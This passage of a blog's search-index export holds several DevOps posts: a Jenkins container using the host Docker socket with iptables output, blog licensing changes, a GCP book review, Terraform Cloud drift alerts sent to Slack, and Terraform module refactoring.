추가 docker exec --user 0 kankins-redocean usermod -aG docker jenkins # (선택) 권한 확인 docker exec --user jenkins kankins-redocean docker ps 이후, Host(EC2)에서 Docker를 재시작하여 허용했습니다. sudo service docker restart systemctl restart docker (4) Jenkins Pipepline 이미 작년 8월에 하셨던 분의 포스팅을 참조하여 파이프라인을 돌렸으나, 가볍게 Nginx 돌려보고 마치겠습니다. pipeline { agent any stages { stage(\u0026#39;Start Nginx\u0026#39;) { steps { sh \u0026#39;\u0026#39;\u0026#39;echo \u0026#34;pwd: \\\\$\\\\$$(pwd)\\\\$\\\\$\u0026#34; echo \u0026#34;whoami: \\\\$\\\\$$(whoami)\\\\$\\\\$\u0026#34; docker run --name docker-nginx -p 80:80 -d nginx:stable-alpine\u0026#39;\u0026#39;\u0026#39; } } } } 접속도 정상적으로 확인됩니다.\nNginx가 Host에서 구동하는 것을 확인하였습니다.\n또한 Host의 Docker 데몬을 사용하였기에, 이미지를 확인해볼 수 있습니다.\n# ubuntu@MyServer:~/kans$ docker images REPOSITORY TAG IMAGE ID CREATED SIZE simple-jenkins-image latest 131b4e942d9a 35 minutes ago 7.8MB kankins-redocean lts-jdk17-240818 c771835009b8 54 minutes ago 616MB nginx stable-alpine 9703b2608a98 2 weeks ago 43.3MB alpine latest 324bc02ae123 5 weeks ago 7.8MB 5. Why\u0026hellip;? (1) Unix 소켓 통신 마운트 중간에 이미 /var/run/docker.sock 의 권한을 허용하면서 눈치 채셨겠지만, 이는 TCP/IP 대신, Unix Socket을 활용하여 접근을 하였습니다. 널널한 개발자님의 Youtube 영상(15:54~) 에도 친절히 나와있지만, Host의 도커 엔진의 소켓과 바이너리를 Jenkins 컨테이너에게 마운트 함으로서 통신을 할 수 있었습니다. (2) 네트워크 설정 살펴보기 네트워크 정보 확인 : docker0 # ubuntu@MyServer:~/kans$ ip -br -c addr lo UNKNOWN 127.0.0.1/8 ::1/128 ens5 UP 192.168.50.10/24 metric 100 fe80::ca:aff:fecd:fc67/64 docker0 UP 172.17.0.1/16 fe80::42:61ff:fe65:129c/64 br-e4c35b376649 DOWN 172.18.0.1/16 fe80::42:b7ff:fe97:45dd/64 veth54addf7@if53 UP fe80::b86f:cbff:fe47:4438/64 veth311d18d@if57 UP fe80::849b:b9ff:fe2f:ba63/64 브릿지 정보 확인 # ubuntu@MyServer:~/kans$ brctl show bridge name\tbridge id\tSTP enabled\tinterfaces br-e4c35b376649\t8000.0242b79745dd\tno\tdocker0\t8000.02426165129c\tno\tveth311d18d veth54addf7 FILTER # ubuntu@MyServer:~/kans$ sudo iptables -t filter -S -P INPUT ACCEPT ## FORWARD ACCEPT가 아닌 DROP으로 설정되어 있습니다. -P FORWARD DROP -P OUTPUT ACCEPT -N DOCKER -N DOCKER-ISOLATION-STAGE-1 -N DOCKER-ISOLATION-STAGE-2 -N DOCKER-USER -A FORWARD -j DOCKER-USER -A FORWARD -j DOCKER-ISOLATION-STAGE-1 -A FORWARD -o docker0 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT -A FORWARD -o docker0 -j DOCKER ## docker0 대역에서 (1) 대역 간 및 (2) 외부 전달 시 ACCEPT로 설정 -A FORWARD -i docker0 ! -o docker0 -j ACCEPT -A FORWARD -i docker0 -o docker0 -j ACCEPT -A FORWARD -o br-e4c35b376649 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT -A FORWARD -o br-e4c35b376649 -j DOCKER -A FORWARD -i br-e4c35b376649 ! -o br-e4c35b376649 -j ACCEPT -A FORWARD -i br-e4c35b376649 -o br-e4c35b376649 -j ACCEPT -A DOCKER -d 172.17.0.2/32 ! -i docker0 -o docker0 -p tcp -m tcp --dport 8080 -j ACCEPT -A DOCKER -d 172.17.0.2/32 ! -i docker0 -o docker0 -p tcp -m tcp --dport 50000 -j ACCEPT -A DOCKER -d 172.17.0.3/32 ! -i docker0 -o docker0 -p tcp -m tcp --dport 80 -j ACCEPT -A DOCKER-ISOLATION-STAGE-1 -i docker0 ! -o docker0 -j DOCKER-ISOLATION-STAGE-2 -A DOCKER-ISOLATION-STAGE-1 -i br-e4c35b376649 ! -o br-e4c35b376649 -j DOCKER-ISOLATION-STAGE-2 -A DOCKER-ISOLATION-STAGE-1 -j RETURN -A DOCKER-ISOLATION-STAGE-2 -o docker0 -j DROP -A DOCKER-ISOLATION-STAGE-2 -o br-e4c35b376649 -j DROP -A DOCKER-ISOLATION-STAGE-2 -j RETURN -A DOCKER-USER -j RETURN NAT POSTROUTING # ubuntu@MyServer:~/kans$ sudo iptables -t nat -S -P PREROUTING ACCEPT -P INPUT ACCEPT -P OUTPUT ACCEPT -P POSTROUTING ACCEPT -N DOCKER -A PREROUTING -m addrtype --dst-type LOCAL -j DOCKER -A OUTPUT ! -d 127.0.0.0/8 -m addrtype --dst-type LOCAL -j DOCKER ## 172.17.0.0/16 대역에서 외부 전달 시 MASQUERADE(SNAT) 정책이 추가되었음을 확인할 수 있습니다. -A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE -A POSTROUTING -s 172.18.0.0/16 ! -o br-e4c35b376649 -j MASQUERADE -A POSTROUTING -s 172.17.0.2/32 -d 172.17.0.2/32 -p tcp -m tcp --dport 8080 -j MASQUERADE -A POSTROUTING -s 172.17.0.2/32 -d 172.17.0.2/32 -p tcp -m tcp --dport 50000 -j MASQUERADE -A POSTROUTING -s 172.17.0.3/32 -d 172.17.0.3/32 -p tcp -m tcp --dport 80 -j MASQUERADE -A DOCKER -i docker0 -j RETURN -A DOCKER -i br-e4c35b376649 -j RETURN -A DOCKER ! -i docker0 -p tcp -m tcp --dport 7969 -j DNAT --to-destination 172.17.0.2:8080 -A DOCKER ! -i docker0 -p tcp -m tcp --dport 50000 -j DNAT --to-destination 172.17.0.2:50000 -A DOCKER ! -i docker0 -p tcp -m tcp --dport 80 -j DNAT --to-destination 172.17.0.3:80 마치며 이부분은 추가 후술 하겠습니다. References stackoverflow/49434650\nstackoverflow/4651437\n","date":"2024-09-01T09:02:15+09:00","permalink":"https://blog.minseong.xyz/post/kans-1w-container-socket/","section":"post","tags":["kans","networking","docker","jenkins","socket"],"title":"Jenkins 컨테이너에서 Host의 Docker 데몬 사용하기"},{"categories":null,"contents":"Before starting group study, I decided to update my blog.\nVery small things, but I have some needs about it.\nOne is GitHub Actions\u0026rsquo; dependency update and another is Licences.\nCause, Blog is deployed via Github Actions, I need to check dependencies in Github Actions\u0026rsquo; workflow.\nWhat I use is actions/checkout, actions/setup-go, and actions/setup-node.\nName Prev. Version Latest Version Purpose checkout actions/checkoutv3 actions/checkoutv4 Src. and Dest. Branch setup-go actions/setup-go@v4 actions/setup-go@v5 Hugo setup-node actions/setup-node@v3 actions/setup-node@v4 Vanila Framework commit 5d4c9b9 Another thing is Licences.\nAt the first time, I published my posts under MIT Licences.\nBut, I changed it to Creative Commons Licences. CC BY-NC-ND 4.0.\nThere are some reasons.\nFirst, I\u0026rsquo;m a little nervous of crawling by bot for feeding AI(In these days, also called generative AI). It\u0026rsquo;s wondering how effective declared licences could be helpful. But It could be better written in other languages rather than English. I want to communicate with people in my blog\u0026rsquo;s comments. I just do this cause of my curiousity.\nSecond, I was inspired by another blogger a.k.a. Great-Stone. He also uses CC BY-NC-ND 4.0, and it will be rare case based on my experience. ND means No Derivatives.\nSo, I also modified footers for mentioning Licences. Cause, I little hate design, I was struggled to layout Creative Commons\u0026rsquo; Symbol.\nconfig.toml and themes/v-framework/layouts/partials/footer.html are edited.\nIn order the time commit 3cc7166 commit 05ceb4d commit dd67675 commit fa21460 commit c5ace79 commit a3fc4f7 commit 4212d8c Above all, ND means that Others cannot publish(distribute) Secondary creation based on my posts. Sharing the link will be welcomed.\nWhat I planned for further maintanence is implementation about KO/EN toggle with separated posts based on languages tag and broken main layout in mobile.\nThat\u0026rsquo;s all. LoL.\n","date":"2024-08-26T00:02:49+09:00","permalink":"https://blog.minseong.xyz/post/maintanence-in-2024/","section":"post","tags":["blog","github","creativecommons","bot"],"title":"Blog maintanence in 2024"},{"categories":null,"contents":"Jpub에서 최근 출판한 그림으로 배우는 구글 클라우드 101 - 제이펍 홈페이지에 대해,\n짧막하게 소개하는 글입니다.\n《그림으로 배우는 구글 클라우드 101》 서평단으로 본 도서를 제공받아 작성하였습니다. 최근 AWS 프로젝트를 진행하고 있습니다. Terraform을 활용하여, IaC 기반의 인프라 구성을 하고 있는데요.\n작년부터 DR(DR, Disaster Recovery)이 급격하게 화두가 되면서,\nMulti-AZ, Multi-Region을 넘어 Multi-Cloud도 고려의 대상이 되는 것 같습니다.\n관심이 있는지라 이번 프로젝트가 끝나면, AWS 외에도 GCP같은 다양한 CSP를 다시금 다뤄보고 싶다는 생각이 들었습니다.\n물론 GCP를 주력으로 쓰고 있다면 이야기가 다르겠지만,\n맨 처음 클라우드를 배우는 입장, 혹은 GCP에 대한 구축 경험이 적은 상황에서 요구사항에 따라 추가적으로 GCP를 구축해야하는 상황이라면\n국내에서는 기존에 GCP를 빠르게 접근하고 배울 수 있는 방법이 AWS 대비 많지 않다고 느꼈습니다.\n예를 들어, 아래의 두 가지 방법이 대표적인데요.\nGCP Webinar에 꾸준히 참여하여, GCP의 기본적인 서비스들에 대해 알아가는 방법 Cloud Skill Boost(구, Qwiklabs) 같은 공인 온라인 핸드온을 따라해보는 방법 Cloud Skill Boost를 통해, 초반에 Cloud에 대해 친숙해지는 데에는 제가 분명 큰 도움이 되었지만,\n쉽사리 머릿 속에 그림으로 그려지지 않아 답답했습니다. 아, Cloud Skill Boost를 학습하면 뱃지를 줍니다. 뱃지를 모아보세요. :) (뱃지 컬렉션 현황)\n특히 주변 몇몇과 함께 (당시)Qwiklabs를 진행하면서,\nGCP 웹 콘솔의 인터페이스는 어디에 뭐가 있는지 명확하지 않다는 의견이 있었고요.\n처음에 Cloud shell에서 authority 활성화를 해야, 작업이 수월해진다는 것도 웨비나를 통해 알게 되었습니다.\n웨비나나 오프라인 세미나에 참여하여 들어봐도, 돌아와서 다시 정리해보면 아래처럼 그림이 한번에 그려지는 것도 아니었고요.\n( 출처: https://devopsnet.com/2022/01/04/cloud-run-vs-gke-vs-gke-autopilot/ )\n물론 지금은 Terraform 덕에 인터페이스의 까칠한 정도는 크게 상관이 없지만, 아무래도 진입 장벽이 되는 것은 사실입니다.\n특히나, 팀프로젝트를 진행해보면서 많은 분들께서 국내 블로그들을 많이 참조한다는 것을 깨닫게 되었는데,\nAWS 대비 GCP로 인프라 아키텍처를 구성하는 사례들이 적기에 초반에 배우기가 힘든 것 같습니다.\n그렇게 오랫동안 GCP를 내려놓고 있다가, 서평단 공고를 보고 호기심이 동하여 응모하여 책을 받아보았습니다.\n일반 전문서적과는 다르게 가로로 길게 되어있는 책입니다.\n책의 저작권이 있기에 온라인 서점에서 제공된 미리보기 페이지 기준으로 소개하려고 합니다.\n대표적으로 서버리스 서비스는 AWS에서 Lambda, GCP에서는 Cloud Function이라는 이름으로 제공되고 있습니다.\n책의 왼쪽에는 GCP의 Cloud Function에 대해 중요 포인트에 대해 요약된 그림이 그려져있습니다.\n오른쪽에는 해당 서비스에 대해 어떤 특징을 갖고 어떻게 쓰는 것인지 설명이 되어있습니다.\n현재 프로젝트가 한창이라, 이것이 끝나게 되면 책의 남은 부분들을 읽어보며\nGKE Autopilot 모드(AWS EKS Fargate와 비슷한 서비스)와 같은 GCP 서비스들을 이해하고\n기존에 체득하고 인지하고 있는 AWS 서비스들과 머릿속에서 매핑해보려 합니다.\n단점은 일반 전문서적처럼 인덱싱이나 목차가 상세하지 않다는 점이지만,\n어차피 각 섹션별로 나와있는 내용은 GCP를 사용함에 있어 다 알고 있어야하는 내용이기에 크게 결점으로 느껴지진 않았습니다.\n다시 한번 도서 서평단으로 선정해주신 제이펍에 감사드립니다.\n구매처 모음: 네이버 쇼핑 ","date":"2023-11-21T13:51:29+09:00","permalink":"https://blog.minseong.xyz/post/visualizing-google-cloud-101-book-review/","section":"post","tags":["GCP","book","jpub"],"title":"그림으로 배우는 구글 클라우드 101 리뷰"},{"categories":null,"contents":"CloudNet@에서의 Terraform 스터디가 끝나고 나서,\n테라폼을 실제 운영 상황에 도입하면서 마주할 수 밖에 없는 드리프트(drift) 상황에 대해\n이해해보는 시간을 가졌습니다.\n참고) TFC에서의 Drift Detection 기능은 현재 TFC Plus 에디션에서 지원됩니다. 1. 용어 이해해보기 사실은 작년부터 테라폼을 접하고나서, IaC라는 개념에 꽂히기만 했지\n운영 입장에서 마주했었던 수많은 시행착오들을 흔한 유저에러로만 생각해왔었습니다.\n스터디에 참여하면서 종종 \u0026lsquo;드리프트\u0026rsquo;라는 단어를 듣고, 찾아보니\n상당부분이 이에 속하는 상황이라는 것을 알 수 있었습니다.\n(1) Drift? 글 작성을 위해 찾아본 기술적 Drift는 본래 주행에 있어서의 그것과\n크게 차이가 없음을 알 수 있었습니다.\n현재까지 이해한 바로는 엔지니어의 계획에 의해 구성된 설계 내에서\n리소스가 생성되고 관리가 되어야 하는데,\n(1) 시간이 흐르거나 (2) 일시적이거나 급한 상황에 따라\n계획된 구성을 벗어나는 현상 그 자체라고 이해해보았습니다.\n(2) Terraform에서의 Drift 과거에 제가 테라폼을 처음 접하고 적용하는 상황에 비추어보면,\n제가 요청받은 사항(주로, 테스트 개발용 인스턴스, 도메인, AMI 등)을\ntf코드로 구성한 후,\n태그를 고치는 작업 테스트서버용 도메인을 수정하는 작업 위와 같은 자잘한 사항을 처음에 값을 바꾸고난 이후에,\n새로이 요청받은 리소스를 셋업할 때 처음 마주하였습니다.\n좀더 일반적으로 풀어보면, 테라폼으로 환경을 구축한 이후에\nCSP에서 제공하는 CLI나 웹콘솔 등에서 수동으로 VM 크기 등을 변경하는 상황 CloudFormation(AWS), ARM템플릿/Bicep(Azure), Chef, Puppet\n또는 Ansible 같이 Terraform에 의해 자동화되지 않은 프로세스를 실행하는 상황 으로 인해서 Terraform의 상태 파일이 감지하지 못하는\n변경 사항이 발생하는 경우라고 하네요.\n(3) Drift 발생 상황이 문제가 되는가? 보통은 terraform plan이나 apply(plan이 선행됨)를 통하면,\n이러한 변경사항(drift)를 확인할 수 있기 때문에 큰 이슈라고 생각하지 않을 수 있습니다.\n찾아보니, 일부 변경사항은 확인이 안될 수도 있기 때문에\n수동으로 해결해야하는 상황이 발생할 수 있습니다. 더 나아가, 테라폼 외부에서 변경된 사항을 되돌리는 과정에서\n리소스를 쓰지 못할 수도 있고, 배포 실패를 초래할 수 있습니다. 2. Drift에 대한 알림 및 설정 w/Terraform Cloud 그러면 이러한 사항에 대해 알림을 설정하여,\n인프라 관리자가 사항을 적시에 알 수 있도록 해보겠습니다.\n현재 TFC Free를 써보고 있기에, 모든 테라폼 작업 요청에 대해 알람을 걸어보겠습니다.\n(1) Terraform Cloud 연결 예전 포스팅에서 다룬 테라폼 코드입니다\n예제 소스: Github (브랜치명: setting-for-tfc)\nTFC에서 안내하는 대로 root 모듈 내의 terraform 부분을 수정합니다.\n# demo_terraform_module/provider_for_module/main.tf terraform { cloud { organization = \u0026#34;kkumtree\u0026#34; workspaces { name = \u0026#34;t101\u0026#34; } } required_providers { aws = { source = \u0026#34;hashicorp/aws\u0026#34; version = \u0026#34;~\u0026gt; 5.17.0\u0026#34; } external = { source = \u0026#34;hashicorp/external\u0026#34; version = \u0026#34;~\u0026gt; 2.3.1\u0026#34; } } } 이후에는 TFC에서 쓸 AWS 접속 정보를 셋업합니다. (택일) (1) TFC용 IAM User를 생성하여 연결하거나,\n(2) TFC용 OIDC 프로바이더를 생성하여 연결합니다.\nIdP를 선택하였고, 예제 파일을 구동하기 위해 권한은\nAmazonEC2FullAccess, iam:PassRole 을 할당하였습니다.\nIAM Role을 호출하기에, Role을 설정하지 않으면 에러가 발생합니다. (2) Slack 알림 설정 Slack 알람 설정 인터페이스가 좀 많이 바뀌었는데,\n큰 틀에서는 달라진게 없어서 웹훅URL을 발급받아 연결할 수 있었습니다. TFC에서는 아래와 같이 설정하면 됩니다. 예전에 local 백엔드에서 했던대로 하면 될 줄 알았는데,\nTFC에서는 모듈 경로를 로컬의 상대경로로 지정하면 오류가 발생합니다. github에 예제 코드를 공개로 저장했었기에,\n예제에 안내된 방식 git::https://github.com로 했다가, 에러가 났습니다.\n차분히, Github를 참조하여 아래와 같이 지정하였습니다.\ngit::git@github.com:kkumtree/demo_terraform_module.git//modules/terraform-aws-ec2?ref=setting-for-tfc //: 테라폼이 해당 부분 이후를 서브 디렉토리로 인식할 수 있게 합니다.\nref: 브랜치, 혹은 태그. 본 포스팅에서도 브랜치를 선택하는 용도로 사용하였습니다.\n제대로 수정한 이후에 module을 git에서 가져오는 것을 볼 수 있습니다. 테라폼 명령어를 입력할 때마다, 알림을 받아볼 수 있었습니다. 3. (번외) drift 알림을 만들어서 써보기 다른 서드파티들을 보니 Cron작업으로 drift detection을 하는 것 같아,\nBash 스크립팅을 통해 간이로 알림을 보내는 작업을 해보겠습니다. 단, 현재 버전에서는 output파일을 로컬에 내보내려면,\nTFC의 기본 실행 모드(Default Execution Mode)를\nRemote에서 Local로 변경해야 합니다. 고유의 강점인 웹 콘솔에서의 협업-review- 기능을 포기한다고 생각하면 됩니다.\n대신에, 사용자 지정 모듈을 다시 원래 상대경로로 로드할 수 있었습니다. 실제 운영용으로 한다면, plan 중 Lock이 걸릴 것이므로 유의. #!/bin/bash terraform plan --detailed-exitcode -out=tf.plan 2\u0026gt; /dev/null || ec=$? case $ec in 0) echo \u0026#34;No Changes Found\u0026#34;: exit 0;; 1) printf \u0026#39;%s/n\u0026#39; \u0026#34;Command exited with non-zero\u0026#34;;exit 1;; 2) echo \u0026#34;Changes found\u0026#34;; MESSAGE=$(terraform show -no-color tf.plan| awk \u0026#39;/#/,EOF { print $0 }\u0026#39;); curl -X POST -H \u0026#39;Content-type: application/json\u0026#39; --data \u0026#34;{\u0026#39;text\u0026#39;:\u0026#39;$MESSAGE\u0026#39;}\u0026#34; $SLACK_WEBHOOK esac 위에 쓰여진 $SLACK_WEBHOOK 은 웹훅 URL 주소를 bash 환경변수로 지정하였습니다.\n포스팅을 위해 스크린샷을 저장하려고 하니, 불필요한 변경점이 발생합니다.\n그래서, AMI 관련 lifecycle 예외조건을 걸어\n변경점을 줄인 뒤 해당 쉘을 실행해보겠습니다. # In EC2 resource block lifecycle { ignore_changes = [ tags, ami, ] } 이제, Bastion 인스턴스(LAB-SSH)에 접속하는데 쓰일 SG의 IP주소만 바꿨을 때,\n이에 대한 드리프트만 발생됨을 볼 수 있습니다. 예제이기 때문에, 알림에 있어 불필요한 정보까지 나열되었지만\n변경사항(drift)이 있을 경우에만 알림을 받는다는 목적은 달성하였습니다. local 모드로 실행할 경우, state파일이 저장되는 방식도 다소 달라짐을 볼 수 있습니다. 4. 마치며 소감) 아직도 갈길이 멀지만, 잘못 알고있었던 것을 바로잡을 수 있었던 귀한 5주 간의 스터디였습니다. (__) Drift에 대해 이해해보는 시간이 되었습니다. 원격지(VCS)에서 sub-directory 방식으로 사용자 지정 모듈을 호출하였습니다. Slack 웹훅을 통하여, TFC로부터의 알림을 수신했습니다. TFC의 실행모드를 변경하여, 차이를 살펴보았습니다. lifecycle을 처음 사용해보았고, 이를 통해 불필요한 작업을 줄일 수 있었습니다. 모니터링 관점에서 TFC Plus를 고려해보는 것도 좋은 방법이 될 수 있을 것 같습니다. 5. References CloudNet@ 테라폼으로 시작하는 IaC Trend Micro/Terraform Tutorial: Drift Detection Strategies GitHub/terraform hashicorp/Modules in Package Sub-directories hashicorp/Manage resource drift hashicorp/discuss hashicorp/resource-lifecycle hashicorp/The lifecycle Meta-Argument spacelift/Terraform Drift – How to Detect and Manage It sendbird/Infrastructure Management using Terraform Medium/Send Terraform Drift Status To Slack Channel ","date":"2023-10-15T00:10:33+09:00","permalink":"https://blog.minseong.xyz/post/notification-about-terraform-cloud-drift/","section":"post","tags":["Terraform","CloudNet@","AWS","TFC","drift"],"title":"TFC(Terraform Cloud) drift 알림 설정"},{"categories":null,"contents":"This week is last week of CloudNet@ group study about terraform.\nIn this study, my personal goal is making AWS architecture only with terraform and one tfstate file.\nBasic knowledge about AWS resources is required. 1. Terraform without Module Before, I already met terraform for maintaining AWS in production level.\nBut at that time, our team maintain them as folder structure which is used by terraformer\n# example structure $ tree . ├── alb │ ├── lb.tf │ ├── lb_listener.tf │ ├── lb_target_group.tf │ ├── lb_target_group_attachment.tf │ ├── outputs.tf │ ├── provider.tf │ └── variables.tf ├── auto_scaling │ ├── autoscaling_group.tf │ ├── launch_template.tf │ ├── outputs.tf │ ├── provider.tf │ └── variables.tf ├── ec2_instance │ ├── instance.tf │ ├── outputs.tf │ ├── provider.tf │ └── variables.tf ├── eni │ ├── network_interface.tf │ ├── outputs.tf │ └── provider.tf ├── igw │ ├── internet_gateway.tf │ ├── outputs.tf │ ├── provider.tf │ └── variables.tf ├── nacl │ ├── default_network_acl.tf │ ├── outputs.tf │ ├── provider.tf │ └── variables.tf ├── route_table │ ├── main_route_table_association.tf │ ├── outputs.tf │ ├── provider.tf │ ├── route_table.tf │ ├── route_table_association.tf │ └── variables.tf ├── s3 │ ├── outputs.tf │ ├── provider.tf │ └── s3_bucket.tf ├── sg │ ├── outputs.tf │ ├── provider.tf │ ├── security_group.tf │ └── variables.tf ├── subnet │ ├── outputs.tf │ ├── provider.tf │ ├── subnet.tf │ └── variables.tf └── vpc ├── outputs.tf ├── provider.tf └── vpc.tf At glance, this solution looks like cool.\nBut, problems were enough critical to think \u0026lsquo;why we have to use terraform?\u0026rsquo;.\nterraform state file(.tfstate) are spread at each folder.\nIt means, checkpoint we have to manage will be increased as much as we add new resources. Cause by 1, each resource is dependent on other resources.\nIt means, we have to manage resources in order.\nFor example, we have to create VPC first, and then we can create subnet.\nAnd if we don\u0026rsquo;t need specific resource, we have to check other resources whether they refer to the resource.\nThese actions could cause human error and affect to production services. 2. Terraform with Module I had been failed to understand and transform legacy terraform structure to module structure, before the group study started.\nIn this post, I use basic AWS 1-tier architecture as example.\n(1) Create legacy(folder) structure by terraformer To make ease transformation, make architecture in AWS Web console.\nAnd then, I use terraformer to make terraform files.\nHow to use terraformer? See official Docs, OR my post. :)\n(2) Create folder tree for module structure There are too much best practices to read all of them about terraform module. (By coincidence, all of them are written in medium)\nref_1) Terraform Modules ref_2) How Terraform Works : Modules Illustrated ref_3) Terraform: Creating Reusable Modules-Part 1 Depth of folder is your choice, I make it below.\n(It is suggested in the study and Book)\n$ tree . ├── modules │ ├── terraform-aws-alb │ │ ├── listener.tf │ │ ├── main.tf │ │ ├── output.tf │ │ ├── tg.tf │ │ ├── tg_attachment.tf │ │ └── variable.tf │ ├── terraform-aws-ec2 │ │ ├── data.tf │ │ ├── main.tf │ │ ├── output.tf │ │ └── variable.tf │ ├── terraform-aws-igw │ │ ├── main.tf │ │ ├── outputs.tf │ │ └── variable.tf │ ├── terraform-aws-route_table │ │ ├── association.tf │ │ ├── main.tf │ │ ├── main_association.tf │ │ ├── output.tf │ │ └── variable.tf │ ├── terraform-aws-sg │ │ ├── data.tf │ │ ├── main.tf │ │ ├── output.tf │ │ └── variable.tf │ ├── terraform-aws-subnet │ │ ├── main.tf │ │ ├── output.tf │ │ └── variable.tf │ └── terraform-aws-vpc │ ├── main.tf │ ├── output.tf │ └── variable.tf └── provider_for_module ├── main.tf ├── modules.tf └── output.tf Child modules have prefix terraform-aws- I named root(parent) module as provider_for_module to distinguish. (3) Transform legacy structure to module structure In this section, only handle ec2 module as practice\n$ tree . └── terraform-aws-ec2 ├── data.tf ├── main.tf ├── output.tf └── variable.tf I divide terraform files for concentrating on actions.\n(Optional) and filename is just my policy.\nmain.tf : Only IaC for ec2 module.\nGuide is well-described in Docs. variable.tf : variables for customizing ec2 resources at local.\nex. name, tags data.tf : (Optional) data on AWS, they have to exist before managing resources.\nAlso guide exists in Docs.\nex. ami output.tf : (Optional) output for other modules.\nex. ec2_id, ec2_ip, ec2_primary_network_interface_id Examples are below.\n# main.tf resource \u0026#34;aws_instance\u0026#34; \u0026#34;ssh\u0026#34; { ami = data.aws_ami.al2023-arm64.id associate_public_ip_address = \u0026#34;true\u0026#34; instance_type = var.instance_type_arm64 key_name = var.key_name metadata_options { http_put_response_hop_limit = \u0026#34;2\u0026#34; http_tokens = \u0026#34;required\u0026#34; } tags = { Name = var.instance_tag_name_ssh } tags_all = { Name = var.instance_tag_name_ssh } source_dest_check = \u0026#34;true\u0026#34; subnet_id = var.subnet_pub-a_id vpc_security_group_ids = [ var.sg_sg-ssh_id ] } # output.tf output \u0026#34;aws_instance_ssh_id\u0026#34; { value = aws_instance.ssh.id } output \u0026#34;aws_instance_nat-a_eni_id\u0026#34; { value = aws_instance.nat-a.primary_network_interface_id } locals { aws_instance_web-a_id = aws_instance.web-a.id aws_instance_web-c_id = aws_instance.web-c.id aws_instance_nat-a_id = aws_instance.nat-a.id aws_instance_nat-c_id = aws_instance.nat-c.id aws_instance_ssh_id = aws_instance.ssh.id /* aws_instance_ssh-c_id = aws_instance.ssh-c.id */ } output \u0026#34;generated_ec2_via_module\u0026#34; { value = { web-a = aws_instance.web-a.id web-c = aws_instance.web-c.id nat-a = aws_instance.nat-a.id nat-c = aws_instance.nat-c.id ssh = aws_instance.ssh.id /* ssh-c = aws_instance.ssh-c.id */ } } # data.tf data \u0026#34;aws_ami\u0026#34; \u0026#34;al2023-arm64\u0026#34; { most_recent = true owners = [\u0026#34;amazon\u0026#34;] filter { name = \u0026#34;name\u0026#34; values = [\u0026#34;al2023-ami-*-arm64\u0026#34;] } } data \u0026#34;aws_launch_template\u0026#34; \u0026#34;ssh-tpl-al2023-arm64\u0026#34; { name = \u0026#34;LAB-SSH-TPL\u0026#34; } # variable.tf variable \u0026#34;instance_type_arm64\u0026#34; { description = \u0026#34;Instance type for ARM64 instances\u0026#34; default = \u0026#34;t4g.small\u0026#34; } variable \u0026#34;vpc_id\u0026#34; { description = \u0026#34;Security group IDs for web instances\u0026#34; default = null } variable \u0026#34;instance_tag_name_ssh\u0026#34; { description = \u0026#34;Instance tag name\u0026#34; default = \u0026#34;LAB-SSH\u0026#34; } Oh, Wait\u0026hellip; Why vpc_id variable is null?\n(4) Create root module At first, I set variables in each module\u0026hellip;\nBecause, It was traditional way.\nBut, I realized that checkpoint to be maintained would be tremendously increased;\nSo, I changed plan by setting variables partially in root module.\nroot module structure └── provider_for_module ├── main.tf ├── modules.tf └── output.tf main.tf : I specify only terraform and provider blocks. terraform : Set providers version.\n(Also we can set backend strategy here.) provider : Set AWS provider for sharing with all modules.\nAlso we can default values like tags for monitoring all.\nBefore making module, provider should be set in a .tf file of each folder.\nBy module, we can set provider in root module once. modules.tf : Connect with child modules. source : path of child module. depend_on : (Optional) Set dependency between modules.\nMost AWS resources have dependency with each other. Just for safe launch. variable : Set variables for child module.\nAt here, we use other resources made in other modules, as variables. providers : (Optional) Set specific provider for child module.\nWe set AWS provider as aws in main.tf. So, we can reuse it here. output.tf : (Optional) output for the machine that handles terraform. # main.tf terraform { required_providers { aws = { source = \u0026#34;hashicorp/aws\u0026#34; version = \u0026#34;~\u0026gt; 5.17.0\u0026#34; } external = { source = \u0026#34;hashicorp/external\u0026#34; version = \u0026#34;~\u0026gt; 2.3.1\u0026#34; } } } provider \u0026#34;aws\u0026#34; { region = \u0026#34;ap-northeast-2\u0026#34; default_tags { tags = { \u0026#34;Project\u0026#34; = \u0026#34;LAB_AWS_TF00\u0026#34; \u0026#34;Environment\u0026#34; = \u0026#34;Learning\u0026#34; \u0026#34;Terraform\u0026#34; = \u0026#34;true\u0026#34; } } } # modules.tf module \u0026#34;local_module_ec2\u0026#34; { source = \u0026#34;../modules/terraform-aws-ec2\u0026#34; depends_on = [ module.local_module_vpc, module.local_module_subnet, module.local_module_sg, module.local_module_igw ] vpc_id = module.local_module_vpc.aws_vpc_vpc_id subnet_pri-a_id = module.local_module_subnet.aws_subnet_pri-a_id subnet_pri-c_id = module.local_module_subnet.aws_subnet_pri-c_id subnet_pub-a_id = module.local_module_subnet.aws_subnet_pub-a_id subnet_pub-c_id = module.local_module_subnet.aws_subnet_pub-c_id sg_sg-web_id = module.local_module_sg.aws_security_group_sg-web_id sg_sg-nat_id = module.local_module_sg.aws_security_group_sg-nat_id sg_sg-ssh_id = module.local_module_sg.aws_security_group_sg-ssh_id } module \u0026#34;local_module_vpc\u0026#34; { source = \u0026#34;../modules/terraform-aws-vpc\u0026#34; } # output.tf output \u0026#34;local_module_output_ec2\u0026#34; { value = module.local_module_ec2.aws_instance_web-a_id } output \u0026#34;local_module_output_vpc\u0026#34; { value = module.local_module_vpc.aws_vpc_vpc_id } 3. Check terraform works (1) terraform apply (2) all resources are created (3) terraform destroy to delete all 4. Advantages of module structure I think, advantages of module structure is..\nWe can manage all resources in one tfstate file. Variables could be controlled in one root folder! It could be easier to find dependency error between resources.\n5. Conclusion In this post, I review my terraform code with module structure.\nIt was not easy to configure but understanding resources well in admin\u0026rsquo;s view.\nThis example still have some problems to be refactored.\nI wish this post will be helpful to moduling terraform.\nSource Code: https://github.com/kkumtree/demo_terraform_module 6. References CloudNet@ terraformer my blog/terrafomer usage Terraform Modules How Terraform Works : Modules Illustrated Terraform: Creating Reusable Modules-Part 1 Terraform/AWS provider Docs ","date":"2023-10-04T11:24:13+09:00","permalink":"https://blog.minseong.xyz/post/architecting-aws-with-terraform-module/","section":"post","tags":["Terraform","CloudNet@","AWS","refactoring"],"title":"Understanding terraform module"},{"categories":null,"contents":"Removing \u0026amp; installing packages are some annoying, isn\u0026rsquo;t it? So, I like using version managers like SDKMAN, nvm, etc..\nI also use tfenv for terraform version management.\n(prev post: KR/\u0026lsquo;Terraform 시작하기 w/Minimal Ubuntu\u0026rsquo;)\nAnd I recommend 